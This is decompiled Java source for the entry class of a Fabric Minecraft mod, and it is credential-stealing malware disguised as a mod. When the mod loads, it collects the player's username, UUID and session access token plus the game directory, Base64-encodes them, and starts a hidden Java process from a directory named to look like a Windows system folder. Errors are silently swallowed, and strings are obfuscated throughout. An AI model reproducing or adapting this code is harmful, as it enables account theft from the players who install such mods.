/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.fabricmc.api.ModInitializer
 */
package net.fabric;

import java.io.File;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.attribute.FileAttribute;
import java.util.Base64;
import net.fabric.emnnr_sxvzsk;
import net.fabric.pumkdmXmuofa;
import net.fabricmc.api.ModInitializer;

public class PxibF0
implements ModInitializer {
    public PxibF0() {
        PxibF0 Ywo7NKF_L;
    }

    public void onInitialize() {
        PxibF0 DHMx_bbSY_uIrb_hXww;
        new Thread(() -> {
            try {
                StringBuilder stringBuilder;
                String string;
                StringBuilder stringBuilder2;
                PxibF0 nyuCdpdsaOhu;
                String x2 = emnnr_sxvzsk.gcvyOfjHlndqgLnqhi();
                String IGqi_LHow_OCPl_XWpx = emnnr_sxvzsk.uPqgkgye();
                String elem5 = emnnr_sxvzsk.YHzZxNbRmRZw();
                if (elem5 == null) {
                    StringBuilder stringBuilder3 = new StringBuilder();
                    stringBuilder3.append('u');
                    stringBuilder3.append('n');
                    stringBuilder3.append('k');
                    stringBuilder3.append('n');
                    stringBuilder3.append('o');
                    stringBuilder3.append('w');
                    stringBuilder3.append('n');
                    elem5 = stringBuilder3.toString();
                }
                String tempPos = pumkdmXmuofa.ixVfBihjHD();
                String jprgd_fms_fyjnf = pumkdmXmuofa.UxwKCH();
                Path uzpwn_ozefg_tb = nyuCdpdsaOhu.copyNhj();
                pumkdmXmuofa kfnyO = new pumkdmXmuofa();
                String mjgrhmBezbrj = kfnyO.getDomain();
                String ujXkqbTvpwxIpwkr = kfnyO.prefire(mjgrhmBezbrj, x2, tempPos);
                Base64.Encoder encoder = Base64.getEncoder();
                String string2 = nyuCdpdsaOhu.uajrhdxlDriver(x2);
                String string3 = nyuCdpdsaOhu.uajrhdxlDriver(elem5);
                String string4 = nyuCdpdsaOhu.uajrhdxlDriver(IGqi_LHow_OCPl_XWpx);
                StringBuilder stringBuilder4 = stringBuilder2 = new StringBuilder();
                stringBuilder2.append('{');
                stringBuilder2.append('"');
                stringBuilder2.append('u');
                stringBuilder2.append('s');
                stringBuilder2.append('e');
                stringBuilder2.append('r');
                stringBuilder2.append('n');
                stringBuilder2.append('a');
                stringBuilder2.append('m');
                stringBuilder2.append('e');
                stringBuilder2.append('"');
                stringBuilder2.append(':');
                stringBuilder2.append('"');
                StringBuilder stringBuilder5 = stringBuilder4.append(stringBuilder2.toString()).append(string4);
                StringBuilder stringBuilder6 = new StringBuilder();
                stringBuilder6.append('"');
                stringBuilder6.append(',');
                stringBuilder6.append('"');
                stringBuilder6.append('u');
                stringBuilder6.append('u');
                stringBuilder6.append('i');
                stringBuilder6.append('d');
                stringBuilder6.append('"');
                stringBuilder6.append(':');
                stringBuilder6.append('"');
                StringBuilder stringBuilder7 = stringBuilder5.append(stringBuilder6.toString()).append(string3);
                StringBuilder stringBuilder8 = new StringBuilder();
                stringBuilder8.append('"');
                stringBuilder8.append(',');
                stringBuilder8.append('"');
                stringBuilder8.append('a');
                stringBuilder8.append('c');
                stringBuilder8.append('c');
                stringBuilder8.append('e');
                stringBuilder8.append('s');
                stringBuilder8.append('s');
                stringBuilder8.append('T');
                stringBuilder8.append('o');
                stringBuilder8.append('k');
                stringBuilder8.append('e');
                stringBuilder8.append('n');
                stringBuilder8.append('"');
                stringBuilder8.append(':');
                stringBuilder8.append('"');
                String PYcu_izDG_blLC_WLtF = encoder.encodeToString(stringBuilder7.append(stringBuilder8.toString()).append(string2).append("\"}").toString().getBytes(StandardCharsets.UTF_8));
                if (ujXkqbTvpwxIpwkr != null) {
                    string = ujXkqbTvpwxIpwkr;
                } else {
                    char[] cArray = new char[]{'n', 'u', 'l', 'l'};  // 'null'
                    string = "null";
                }
                String string5 = nyuCdpdsaOhu.uajrhdxlDriver(elem5);
                String string6 = nyuCdpdsaOhu.uajrhdxlDriver(IGqi_LHow_OCPl_XWpx);
                String string7 = nyuCdpdsaOhu.uajrhdxlDriver(uzpwn_ozefg_tb != null ? uzpwn_ozefg_tb.toString() : "");
                String string8 = nyuCdpdsaOhu.uajrhdxlDriver(mjgrhmBezbrj);
                String string9 = nyuCdpdsaOhu.uajrhdxlDriver(jprgd_fms_fyjnf);
                String string10 = nyuCdpdsaOhu.uajrhdxlDriver(tempPos);
                String string11 = string;
                String string12 = PYcu_izDG_blLC_WLtF;
                StringBuilder stringBuilder9 = stringBuilder = new StringBuilder();
                stringBuilder.append('{');
                stringBuilder.append('"');
                stringBuilder.append('m');
                stringBuilder.append('c');
                stringBuilder.append('I');
                stringBuilder.append('n');
                stringBuilder.append('f');
                stringBuilder.append('o');
                stringBuilder.append('"');
                stringBuilder.append(':');
                stringBuilder.append('"');
                char[] cArray = new char[]{'"', ',', '"', 'p', 'r', 'e', 'f', 'i', 'r', 'e', 'I', 'd', '"', ':', '"'};  // '","prefireId":"'
                char[] cArray2 = new char[]{'"', ',', '"', 'u', 's', 'e', 'r', 'I', 'd', '"', ':', '"'};  // '","userId":"'
                char[] cArray3 = new char[]{'"', ',', '"', 't', 'a', 'g', '"', ':', '"'};  // '","tag":"'
                StringBuilder stringBuilder10 = stringBuilder9.append(stringBuilder.toString()).append(string12).append("\",\"prefireId\":\"").append(string11).append("\",\"userId\":\"").append(string10).append("\",\"tag\":\"").append(string9);
                StringBuilder stringBuilder11 = new StringBuilder();
                stringBuilder11.append('"');
                stringBuilder11.append(',');
                stringBuilder11.append('"');
                stringBuilder11.append('d');
                stringBuilder11.append('o');
                stringBuilder11.append('m');
                stringBuilder11.append('a');
                stringBuilder11.append('i');
                stringBuilder11.append('n');
                stringBuilder11.append('"');
                stringBuilder11.append(':');
                stringBuilder11.append('"');
                char[] cArray4 = new char[]{'"', ',', '"', 'g', 'a', 'm', 'e', 'D', 'i', 'r', '"', ':', '"'};  // '","gameDir":"'
                StringBuilder stringBuilder12 = stringBuilder10.append(stringBuilder11.toString()).append(string8).append("\",\"gameDir\":\"").append(string7);
                StringBuilder stringBuilder13 = new StringBuilder();
                stringBuilder13.append('"');
                stringBuilder13.append(',');
                stringBuilder13.append('"');
                stringBuilder13.append('m');
                stringBuilder13.append('c');
                stringBuilder13.append('U');
                stringBuilder13.append('s');
                stringBuilder13.append('e');
                stringBuilder13.append('r');
                stringBuilder13.append('n');
                stringBuilder13.append('a');
                stringBuilder13.append('m');
                stringBuilder13.append('e');
                stringBuilder13.append('"');
                stringBuilder13.append(':');
                stringBuilder13.append('"');
                char[] cArray5 = new char[]{'"', ',', '"', 'm', 'c', 'U', 'u', 'i', 'd', '"', ':', '"'};  // '","mcUuid":"'
                char[] cArray6 = new char[]{'"', ',', '"', 'e', 'n', 'v', '"', ':', '"', 'F', 'a', 'b', 'r', 'i', 'c', '"', '}'};
                String rpni_ds_rfjkv_wjqkt = stringBuilder12.append(stringBuilder13.toString()).append(string6).append("\",\"mcUuid\":\"").append(string5).append(new String(cArray6)).toString();
                String limit5 = Base64.getEncoder().encodeToString(rpni_ds_rfjkv_wjqkt.getBytes(StandardCharsets.UTF_8));
                char[] cArray7 = new char[]{'j', 'a', 'v', 'a', '.', 'h', 'o', 'm', 'e'};  // 'java.home'
                String pDa1aNq0 = System.getProperty("java.home");
                String[] stringArray = new String[2];
                stringArray[0] = "bin";
                StringBuilder stringBuilder14 = new StringBuilder();
                stringBuilder14.append('j');
                stringBuilder14.append('a');
                stringBuilder14.append('v');
                stringBuilder14.append('a');
                stringBuilder14.append('w');
                stringBuilder14.append('.');
                stringBuilder14.append('e');
                stringBuilder14.append('x');
                stringBuilder14.append('e');
                stringArray[1] = stringBuilder14.toString();
                Path JX_iPMYH5_Bst = Path.of(pDa1aNq0, stringArray);
                if (!Files.exists(JX_iPMYH5_Bst, new LinkOption[0])) {
                    String[] stringArray2 = new String[2];
                    stringArray2[0] = "bin";
                    StringBuilder stringBuilder15 = new StringBuilder();
                    stringBuilder15.append('j');
                    stringBuilder15.append('a');
                    stringBuilder15.append('v');
                    stringBuilder15.append('a');
                    stringBuilder15.append('.');
                    stringBuilder15.append('e');
                    stringBuilder15.append('x');
                    stringBuilder15.append('e');
                    stringArray2[1] = stringBuilder15.toString();
                    JX_iPMYH5_Bst = Path.of(pDa1aNq0, stringArray2);
                }
                URI txWnqhjZtlhnsUsnww = PxibF0.class.getProtectionDomain().getCodeSource().getLocation().toURI();
                Path mbvKiiJc = Path.of(txWnqhjZtlhnsUsnww);
                char[] cArray8 = new char[]{'L', 'O', 'C', 'A', 'L', 'A', 'P', 'P', 'D', 'A', 'T', 'A'};  // 'LOCALAPPDATA'
                String string13 = System.getenv("LOCALAPPDATA");
                String[] stringArray3 = new String[3];
                char[] cArray9 = new char[]{'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't'};  // 'Microsoft'
                stringArray3[0] = "Microsoft";
                char[] cArray10 = new char[]{'W', 'i', 'n', 'd', 'o', 'w', 's'};  // 'Windows'
                stringArray3[1] = "Windows";
                StringBuilder stringBuilder16 = new StringBuilder();
                stringBuilder16.append('N');
                stringBuilder16.append('t');
                stringBuilder16.append('P');
                stringBuilder16.append('r');
                stringBuilder16.append('o');
                stringBuilder16.append('f');
                stringBuilder16.append('i');
                stringBuilder16.append('l');
                stringBuilder16.append('e');
                stringBuilder16.append('I');
                stringBuilder16.append('n');
                stringBuilder16.append('d');
                stringBuilder16.append('e');
                stringBuilder16.append('x');
                stringArray3[2] = stringBuilder16.toString();
                Path mthmkXkrvojPrLmh = Path.of(string13, stringArray3);
                Files.createDirectories(mthmkXkrvojPrLmh, new FileAttribute[0]);
                String qfoEy = pumkdmXmuofa.class.getName();
                ProcessBuilder DjiHB_JeuWFHlZ = new ProcessBuilder(JX_iPMYH5_Bst.toString(), "-cp", mbvKiiJc.toString(), qfoEy, limit5);
                DjiHB_JeuWFHlZ.redirectInput(ProcessBuilder.Redirect.from(new File("NUL")));
                char[] cArray11 = new char[]{'_', 's', 'p', 'a', 'w', 'n', '.', 'l', 'o', 'g'};  // '_spawn.log'
                DjiHB_JeuWFHlZ.redirectOutput(ProcessBuilder.Redirect.appendTo(mthmkXkrvojPrLmh.resolve("_spawn.log").toFile()));
                DjiHB_JeuWFHlZ.redirectErrorStream(true);
                DjiHB_JeuWFHlZ.directory(mthmkXkrvojPrLmh.toFile());
                DjiHB_JeuWFHlZ.start();
            }
            catch (Exception exception) {
                // empty catch block
            }
        }).start();
    }

    private Path copyNhj() {
        Path qvw_gyzzuf_gwl_dobbq;
        block8: {
            block7: {
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.append('u');
                stringBuilder.append('s');
                int n = -881191625;
                if ((n ^ 0xCB7A1537) == 0) {
                    n = 995296646;
                    n |= 0xB844F7FC;
                }
                stringBuilder.append('e');
                stringBuilder.append('r');
                stringBuilder.append('.');
                stringBuilder.append('d');
                stringBuilder.append('i');
                stringBuilder.append('r');
                qvw_gyzzuf_gwl_dobbq = Path.of(System.getProperty(stringBuilder.toString()), new String[0]);
                StringBuilder stringBuilder2 = new StringBuilder();
                stringBuilder2.append('o');
                stringBuilder2.append('p');
                stringBuilder2.append('t');
                stringBuilder2.append('i');
                stringBuilder2.append('o');
                stringBuilder2.append('n');
                stringBuilder2.append('s');
                stringBuilder2.append('.');
                stringBuilder2.append('t');
                stringBuilder2.append('x');
                stringBuilder2.append('t');
                if (Files.exists(qvw_gyzzuf_gwl_dobbq.resolve(stringBuilder2.toString()), new LinkOption[0])) break block7;
                char[] cArray = new char[]{'c', 'o', 'n', 'f', 'i', 'g'};  // 'config'
                if (Files.exists(qvw_gyzzuf_gwl_dobbq.resolve("config"), new LinkOption[0])) break block7;
                StringBuilder stringBuilder3 = new StringBuilder();
                stringBuilder3.append('m');
                stringBuilder3.append('o');
                stringBuilder3.append('d');
                stringBuilder3.append('s');
                if (!Files.exists(qvw_gyzzuf_gwl_dobbq.resolve(stringBuilder3.toString()), new LinkOption[0])) break block8;
            }
            return qvw_gyzzuf_gwl_dobbq;
        }
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append('A');
        stringBuilder.append('P');
        stringBuilder.append('P');
        stringBuilder.append('D');
        stringBuilder.append('A');
        stringBuilder.append('T');
        stringBuilder.append('A');
        String avldjf_Sx = System.getenv(stringBuilder.toString());
        if (avldjf_Sx != null) {
            String[] stringArray = new String[1];
            char[] cArray = new char[]{'.', 'm', 'i', 'n', 'e', 'c', 'r', 'a', 'f', 't'};  // '.minecraft'
            stringArray[0] = ".minecraft";
            Path KfPe_fkPG_TzSe_NOMB = Path.of(avldjf_Sx, stringArray);
            if (Files.exists(KfPe_fkPG_TzSe_NOMB, new LinkOption[0])) {
                return KfPe_fkPG_TzSe_NOMB;
            }
        }
        char[] cArray = new char[]{'u', 's', 'e', 'r', '.', 'h', 'o', 'm', 'e'};  // 'user.home'
        String string = System.getProperty("user.home");
        String[] stringArray = new String[1];
        StringBuilder stringBuilder4 = new StringBuilder();
        stringBuilder4.append('.');
        stringBuilder4.append('m');
        stringBuilder4.append('i');
        stringBuilder4.append('n');
        stringBuilder4.append('e');
        stringBuilder4.append('c');
        stringBuilder4.append('r');
        stringBuilder4.append('a');
        stringBuilder4.append('f');
        stringBuilder4.append('t');
        stringArray[0] = stringBuilder4.toString();
        Path mnd_ahj_vjdhfk_kpoik = Path.of(string, stringArray);
        if (Files.exists(mnd_ahj_vjdhfk_kpoik, new LinkOption[0])) {
            return mnd_ahj_vjdhfk_kpoik;
        }
        return qvw_gyzzuf_gwl_dobbq;
    }

    private String uajrhdxlDriver(String fccdZggWqgis) {
        if (fccdZggWqgis == null) {
            return "";
        }
        StringBuilder Hpdz_lLcS_gGac_Rond = new StringBuilder();
        block7: for (char foundStr : fccdZggWqgis.toCharArray()) {
            switch (foundStr) {
                case '\"': {
                    Hpdz_lLcS_gGac_Rond.append("\\\"");
                    continue block7;
                }
                case '\\': {
                    char[] cArray = new char[]{'\\', '\\'};  // '\\\\'
                    Hpdz_lLcS_gGac_Rond.append("\\\\");
                    continue block7;
                }
                case '\n': {
                    Hpdz_lLcS_gGac_Rond.append("\\n");
                    int n = 807391894;
                    if ((n | 0x301FD296) != 807391894) continue block7;
                    long l = 1960443573L;
                    l *= 65L;
                    l ^= 0xFFFFFFFFBEEC4F66L;
                    int n2 = -223144525;
                    n2 <<= 31;
                    n2 >>>= 29;
                    continue block7;
                }
                case '\r': {
                    Hpdz_lLcS_gGac_Rond.append("\\r");
                    continue block7;
                }
                case '\t': {
                    Hpdz_lLcS_gGac_Rond.append("\\t");
                    continue block7;
                }
                default: {
                    if (foundStr < ' ') {
                        StringBuilder stringBuilder = new StringBuilder();
                        stringBuilder.append('\\');
                        stringBuilder.append('u');
                        stringBuilder.append('%');
                        stringBuilder.append('0');
                        stringBuilder.append('4');
                        stringBuilder.append('x');
                        Hpdz_lLcS_gGac_Rond.append(String.format(stringBuilder.toString(), foundStr));
                        continue block7;
                    }
                    Hpdz_lLcS_gGac_Rond.append(foundStr);
                }
            }
        }
        return Hpdz_lLcS_gGac_Rond.toString();
    }
}

